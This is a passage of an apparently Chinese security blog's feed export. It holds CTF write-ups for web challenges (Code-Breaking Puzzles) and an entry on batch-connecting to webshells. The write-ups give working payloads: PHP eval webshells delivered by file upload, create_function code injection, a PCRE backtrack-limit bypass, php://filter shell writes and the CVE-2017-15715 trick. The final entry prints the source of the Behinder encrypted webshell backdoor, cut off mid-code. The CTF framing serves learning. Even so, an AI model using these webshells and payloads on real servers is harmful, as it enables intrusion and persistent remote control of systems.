text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate<span class="token header-name keyword">Accept-Language:</span> zh-CN,zh;q=0.9,en;q=0.8<span class="token header-name keyword">Connection:</span> close<span class="token header-name keyword">Content-Length:</span> 224------WebKitFormBoundarysVAM76Hq7GOSqE1m<span class="token header-name keyword">Content-Disposition:</span> form-data; name="file"; filename="1.p&lt;br>hp";<span class="token header-name keyword">Content-Type:</span> text/plain&lt;?php phpinfo(); eval($_POST['a']); ?>------WebKitFormBoundarysVAM76Hq7GOSqE1m--</code></pre><p>返回{“url”:”/Public/Uploads/2019-10-24/5db11865ef0bd.php”,”success”:1}，再访问得到flag</p><pre class=" language-php"><code class="language-php"><span class="token operator">/</span><span class="token keyword">Public</span><span class="token operator">/</span>Uploads<span class="token operator">/</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">10</span><span class="token operator">-</span><span class="token number">24</span><span class="token operator">/</span>5db11865ef0bd<span class="token punctuation">.</span>php</code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 框架漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Code-Breaking-Puzzles writeup</title>
      <link href="/2019/10/11/writeup/code-breaking-puzzles-writeup/"/>
      <url>/2019/10/11/writeup/code-breaking-puzzles-writeup/</url>
      
        <content type="html"><![CDATA[<h2 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'arg'</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9_]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$action</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$action</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>第一步：$action有正则限制，可以用\可以绕过。原因就是<strong>\funciton</strong>是php原生函数的写法，就是以命名空间+函数名的方法来表示函数。而原生函数的命名空间是””。类似php框架 Illuminate\Foundation\Application</p><p>第二步：调用create_function函数来代码注入，原理如下</p><p>在PHP中使用create_function()创建匿名函数</p><ol><li>获取参数, 函数体;</li><li>拼凑一个”function __lambda_func (参数) { 函数体;} “的字符串;</li><li>eval;</li><li>通过__lambda_func在函数表中找到eval后得到的函数体, 找不到就出错;</li><li>定义一个函数名:”\000_lambda_” . count(anonymous_functions)++;</li><li>用新的函数名替换__lambda_func;</li><li>返回新的函数。</li></ol><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$q</span> <span class="token operator">=</span> <span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'is'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span><span class="token variable">$sy</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span><span class="token variable">$q</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这个匿名函数相当于这样的创建函数过程:</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">niming</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'is'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>a是匿名函数的参数，a是匿名函数的参数，q所指向的字符串的值是匿名函数的函数体</p><p>payload为<code>url?id=1;}phpinfo();/*</code>时，相当于</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">niming</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token operator">*</span><span class="token punctuation">.</span><span class="token string">'is'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>用;}闭合了函数，phpinfo();后的/*会注释掉之后的代码，create_function函数是调用了eval的，所以phpinfo()函数得以执行。</p><p>本题payload：<code>action=create_function&amp;arg=;}print_r(file_get_contents(&#39;/flag&#39;));//</code></p><h2 id="php-limit"><a href="#php-limit" class="headerlink" title="php limit"></a>php limit</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>正则匹配嵌套函数中不能传参数</p><p>nginx没有getallheaders()函数，可以用get_defined_vars()代替</p><pre><code>GET /?code=eval(next(current(get_defined_vars())));&amp;cmd=system(ls); HTTP/1.1</code></pre><h2 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy - pcrewaf"></a>easy - pcrewaf</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">is_php</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/&lt;\?.*[(`;?>].*/is'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$user_dir</span> <span class="token operator">=</span> <span class="token string">'data/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_php</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"bad request"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$user_dir</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token variable">$user_dir</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.php'</span><span class="token punctuation">;</span>    <span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: $path"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">303</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p>代码的逻辑功能：上传一个文件 不能包含php语句</p><p>解题思路：利用preg_match的漏洞，因为php用的是PCRE库的。</p><h3 id="正则表达式是什么"><a href="#正则表达式是什么" class="headerlink" title="正则表达式是什么"></a>正则表达式是什么</h3><p>正则表达式是一个可以被“有限状态自动机”接受的语言类。</p><p>“有限状态自动机”，其拥有有限数量的状态，每个状态可以迁移到零个或多个状态，输入字串决定执行哪个状态的迁移。</p><p>而常见的正则引擎，又被细分为DFA（确定性有限状态自动机）与NFA（非确定性有限状态自动机）。他们匹配输入的过程分别是：</p><ul><li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li><li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li></ul><p>由于NFA的执行过程存在回溯，所以其性能会劣于DFA，但它支持更多功能。大多数程序语言都使用了NFA作为正则引擎，其中也包括PHP使用的PCRE库。</p><h3 id="回溯过程"><a href="#回溯过程" class="headerlink" title="回溯过程"></a>回溯过程</h3><p>正则<code>&lt;\?.*[(;?&gt;].*</code>假设匹配的输入是，实际执行流程是这样的 <code>&lt;?php phpinfo();//aaaaa</code></p><p><img src="https://www.leavesongs.com/media/attachment/2018/11/26/51bfc7bb-fd9a-402e-971a-a2247b226f3d.3adc35af4c1d.png" alt="image.png"></p><p>见上图，可见第4步的时候，因为第一个<code>.*</code>可以匹配任何字符，所以最终匹配到了输入串的结尾，也就是<code>//aaaaa</code>。但此时显然是不对的，因为正则显示<code>.*</code>后面还应该有一个字符<code>[(</code>;?&gt;]`。</p><p>所以NFA就开始回溯，先吐出一个<code>a</code>，输入变成第5步显示的<code>//aaaa</code>，但仍然匹配不上正则，继续吐出<code>a</code>，变成<code>//aaa</code>，仍然匹配不上……</p><p>最终直到吐出<code>;</code>，输入变成第12步显示的<code>，此时，</code>.<em><code>匹配的是</code>php phpinfo()<code>，而后面的</code>;<code>则匹配上</code>[(<code>;?&gt;]</code>，这个结果满足正则表达式的要求，于是不再回溯。13步开始向后匹配<code>;</code>，14步匹配`.</em><code>，第二个</code>.*`匹配到了字符串末尾，最后结束匹配。</p><p>其中5-12是回溯的过程，回溯了8次</p><h3 id="PHP的pcre-backtrack-limit限制利用"><a href="#PHP的pcre-backtrack-limit限制利用" class="headerlink" title="PHP的pcre.backtrack_limit限制利用"></a>PHP的<code>pcre.backtrack_limit</code>限制利用</h3><p>PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限<code>pcre.backtrack_limit</code>。我们可以通过<code>var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));</code>的方式查看当前环境下的上限：</p><pre><code>php &gt; var_dump(ini_get(&#39;pcre.backtrack_limit&#39;));string(7) &quot;1000000&quot;</code></pre><p>可见，回溯次数上限默认是100万。那么，假设我们的回溯次数超过了100万，会出现什么现象呢？比如：</p><pre><code>php &gt; var_dump(preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, &#39;&lt;?php phpinfo();//&#39;.str_repeat(php &gt; var_dump(preg_match(&#39;/&lt;\?.*[(`;?&gt;].*/is&#39;, &#39;&lt;?php phpinfo();//&#39;.str_repeat(&#39;a&#39;,1000000)));bool(false)</code></pre><p>可见，<code>preg_match</code>返回的非1和0，而是false。</p><p><code>preg_match</code>函数返回false表示此次执行失败了，我们可以调用<code>var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);</code>，发现失败的原因的确是回溯次数超出了限制：</p><pre><code>php &gt; var_dump(preg_last_error() === PREG_BACKTRACK_LIMIT_ERROR);bool(false)</code></pre><p>所以，我们通过发送超长字符串的方式，使正则执行失败，最后绕过目标对PHP语言的限制。</p><pre><code>POST /xdebug.php HTTP/1.1Host: 192.168.0.101Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDLLCrVUTmOAaWTjQConnection: closeContent-Length: 1000242------WebKitFormBoundaryDLLCrVUTmOAaWTjQContent-Disposition: form-data; name=&quot;file&quot;; filename=&quot;webshell&quot;Content-Type: image/jpeg&lt;?php @eval($_POST[admin]);?&gt;aaaaaaaaaaaaaaaaaaaa(a*1000000)------WebKitFormBoundaryDLLCrVUTmOAaWTjQ--</code></pre><h2 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'read-source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'DATA_DIR'</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/data/'</span> <span class="token punctuation">.</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">,</span> <span class="token number">0755</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">chdir</span><span class="token punctuation">(</span><span class="token constant">DATA_DIR</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$domain</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'domain'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token variable">$log_name</span> <span class="token operator">=</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'-Y-m-d'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$domain</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">"dig -t A -q %s"</span><span class="token punctuation">,</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$domain</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$output</span><span class="token punctuation">,</span> <span class="token constant">ENT_HTML401</span> <span class="token operator">|</span> <span class="token constant">ENT_QUOTES</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$log_name</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'SERVER_NAME'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token variable">$log_name</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token function">pathinfo</span><span class="token punctuation">(</span><span class="token variable">$log_name</span><span class="token punctuation">,</span> <span class="token constant">PATHINFO_EXTENSION</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'php'</span><span class="token punctuation">,</span> <span class="token string">'php3'</span><span class="token punctuation">,</span> <span class="token string">'php4'</span><span class="token punctuation">,</span> <span class="token string">'php5'</span><span class="token punctuation">,</span> <span class="token string">'phtml'</span><span class="token punctuation">,</span> <span class="token string">'pht'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$log_name</span><span class="token punctuation">,</span> <span class="token variable">$output</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span><span class="token keyword">endif</span><span class="token punctuation">;</span> <span class="token delimiter">?></span></code></pre><h3 id="绕过后缀名"><a href="#绕过后缀名" class="headerlink" title="绕过后缀名"></a>绕过后缀名</h3><p><code>$log_name</code>之前会加上<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>，其内容为HTTP headers中的<code>Host</code>的值，所有文件名可控。</p><p>只要在后缀名后加上<code>/.</code>，pathinfo就取不到后缀名，且可以正常写入<code>.php</code>之中。</p><p><a href="http://wonderkun.cc/index.html/?p=626" target="_blank" rel="noopener">php &amp; apache2 &amp;操作系统之间的一些黑魔法</a></p><h3 id="绕过内容限制"><a href="#绕过内容限制" class="headerlink" title="绕过内容限制"></a>绕过内容限制</h3><p>我们能写的文件内容被<code>htmlspecialchars</code>函数过滤了一次，尖括号被过滤了</p><p>但文件名可控，当$file传入参数<code>php://filter/write=convert.base64-decode/resource=shell.php</code>，​file_put_contents($file,$text)会将$text的内容base64解码后写入文件</p><p>payload如下</p><pre class=" language-http"><code class="language-http">POST / HTTP/1.1<span class="token header-name keyword">Host:</span> php<span class="token header-name keyword">Content-Type:</span> multipart/form-data; boundary=--------1403836275<span class="token header-name keyword">Content-Length:</span> 236----------1403836275<span class="token header-name keyword">Content-Disposition:</span> form-data; name="domain"PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4123----------1403836275<span class="token header-name keyword">Content-Disposition:</span> form-data; name="log"://filter/write=convert.base64-decode/resource=shell.php/.----------1403836275--</code></pre><h3 id="绕过后缀名2"><a href="#绕过后缀名2" class="headerlink" title="绕过后缀名2"></a>绕过后缀名2</h3><p><strong>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</strong></p><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，<code>1.php\x0A</code>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p><a href="https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2017-15715</a></p><p>payload如下</p><pre class=" language-http"><code class="language-http">domain=PD9waHAgZXZhbCgkX1BPU1RbJ2EnXSk7Pz4123&amp;log=%3a%2f%2ffilter%2fwrite%3dconvert.base64-decode%2fresource%3dxxx.php%0a</code></pre><p>禁用了system函数，读一下目录</p><pre class=" language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function">read_all</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span>returnfalse<span class="token punctuation">;</span><span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">opendir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$fl</span><span class="token operator">=</span><span class="token function">readdir</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token variable">$temp</span><span class="token operator">=</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token constant">DIRECTORY_SEPARATOR</span><span class="token punctuation">.</span><span class="token variable">$fl</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$fl</span><span class="token operator">!=</span><span class="token string">"."</span><span class="token operator">&amp;&amp;</span><span class="token variable">$fl</span><span class="token operator">!=</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token string">"dir----"</span><span class="token punctuation">.</span><span class="token variable">$temp</span><span class="token punctuation">.</span><span class="token string">"\r\n&lt;br>"</span><span class="token punctuation">;</span><span class="token function">read_all</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl</span><span class="token operator">!=</span><span class="token string">"."</span><span class="token operator">&amp;&amp;</span><span class="token variable">$fl</span><span class="token operator">!=</span><span class="token string">".."</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span><span class="token string">"filepath---"</span><span class="token punctuation">.</span><span class="token variable">$temp</span><span class="token punctuation">.</span><span class="token string">"\r\n&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">read_all</span><span class="token punctuation">(</span><span class="token string">"/var/www"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冰蝎批量脚本连接</title>
      <link href="/2019/10/07/awd/bing-he-liu-liang/"/>
      <url>/2019/10/07/awd/bing-he-liu-liang/</url>
      
        <content type="html"><![CDATA[<p>冰蝎后门shell.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">uniqid</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'k'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">print</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token variable">$key</span><span class="token operator">=</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'k'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span>"php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input");</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string">'openssl'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>        <span class="token variable">$t</span><span class="token operator">=</span><span class="token string">"base64_"</span><span class="token punctuation">.</span><span class="token string">"decode"</span><span class="token punctuation">;</span>        <span class="token variable">$post</span><span class="token operator">=</span><span class="token variable">$t</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$post</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        <span class="token variable">$post</span><span class="token operator">=</span><span class="token function">openssl_decrypt</span><span class="token punctuation">(</span><span class="token variable">$post</span><span class="token punctuation">,</span> <span class="token string">"AES128"</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$arr</span><span class="token operator">=</span><span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span><span class="token variable">$post</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token 